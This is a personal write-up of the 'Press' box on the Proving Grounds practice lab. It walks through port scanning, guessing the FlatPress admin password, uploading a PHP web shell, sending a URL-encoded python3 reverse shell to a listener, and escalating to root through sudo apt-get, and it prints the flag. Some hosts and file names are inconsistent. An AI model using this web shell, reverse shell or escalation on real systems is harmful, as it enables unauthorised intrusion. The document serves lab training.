---
Date: 2024-10-12
Platform: PG-Practice
Category: Linux
Difficulty: Intermediate
Status: Complete
IP: 192.168.215.29
Writeup: https://medium.com/@felipeasz007/proving-grounds-pg-presswriteup-93c6d096bae6
---
# Press
This was by far the easiest box I've done, and besides needing a nudge on the password guessing I didn't need the walkthrough at all. I'll need to remember to test `password` as well as `admin`, and I may need to look at short list or a quick `hydra` script to test the most obvious credentials quickly. 

Regardless, as soon as I had access and confirmed I was dealing with Flatpress 1.2.1 I had a multitude of exploit options available - I ended up going with the RCE specifically for 1.2.1 (rather than another for 1.3) and had a little bit of trouble getting command execution until I tweaked the PHP file so it included "php" in it and put the `system` command all on one line.

That allowed me to establish the reverse shell, and then as soon as I ran `sudo -l` I was sure it couldn't be this easy. With no password required to run `apt-get` my first thought was that I'd be able to pull anything onto this system, but checking GTFObins provided an even simpler solution to getting `root`.

# Resolution summary
- Ran Nmap to identify ports `22`, `80` & `8089`
- Visited http (`8089`) & identified `FlatPress pf-1.2.1`
- Used password guesses access to admin panel
- Uploaded `shell2.php` file and navigated to command execution
- Established reverse shell with command execution
- Checked `sudo` privileges and found GTFObin for `apt-get`
- Used `apt-get changelog` to open shell as `root` 
## Improved skills
- password guessing
- Writing PHP
## Used tools
- nmap

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN Press.nmap 192.168.215.29 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Lugx Gaming Shop HTML5 Template
8089/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-generator: FlatPress fp-1.2.1
|_http-title: FlatPress
|_http-favicon: Unknown favicon MD5: 315957B26C1BD8805590E36985990754
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
# Enumeration
## Port 22 - SSH (OpenSSH 8.4p1)
No enumeration conducted
## Port 80 - HTTP (Apache 2.4.56)
- Navigated to `http://192.168.215.29:80`
![[Pasted image 20241012152847.png]]
 - Navigated to `http://192.168.215.29/contact.html` and attempted to send message through contact form
![[Pasted image 20241012153714.png]]
## Port 8089 - HTTP (Apache 2.4.56)
- Navigated to `http://192.168.215.96:9090` and identified `FlatPress pf-1.2.1`
![[Pasted image 20241012152906.png]]
- Navigated to `http://192.168.215.96:9090/login/php` and attempted login with credentials `admin:admin`
![[Pasted image 20241012153036.png]]
- Attempted login with credentials `admin:password` and got access
![[Pasted image 20241012154746.png]]
---
# Exploitation
## Malicious File Upload
- Found RCE vulnerability for `FlatPress 1.2.1` at [https://github.com/flatpressblog/flatpress/issues/152] and followed PoC instructions
- Created `shell.php` with contents;
```
GIF89a;
<?php system($_GET['cmd']);?>
```
- Navigated to `http://192.168.215.29:8089/admin.php?p=uploader` and successfully uploaded `shell2.php`
![[Pasted image 20241012155538.png]]
- Navigated to uploaded file at `http://192.168.215.29:8089/fp-content/attachs/shell2.php` 
![[Pasted image 20241012155809.png]]
- Added `?cmd=whoami` to address bar and found exploit working
![[Pasted image 20241012161115.png]]
- Ran `nc -nvlp 4444` to start listener on port 4444
- Added url-encoded python3 reverse shell to address bar command `?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%22192.168.45.250%22%2C4444%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cf%29for%20f%20in%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fsh%22%29%27` and achieved reverse shell 
![[Pasted image 20241012161855.png]]
---
# Privilege Escalation
## Local Enumeration
Ran `sudo -l` and identified `www-data` can run `/usr/bin/apt-get` without password
![[Pasted image 20241012162013.png]]
## Privilege Escalation vector
- Identified GTFObins for [apt-get](https://gtfobins.github.io/gtfobins/apt-get/) and found elevated privileges could be maintained. Ran the following commands;
```
sudo /usr/bin/apt-get changelog apt
!/bin/sh
```
- Achieved `root` access and ran `cat /root/proof.txt` to print flag `b0f6bae4c11626f41dc028df71718383`
![[Pasted image 20241012162715.png]]
---
# Trophy & Loot
`root.txt` = `b0f6bae4c11626f41dc028df71718383`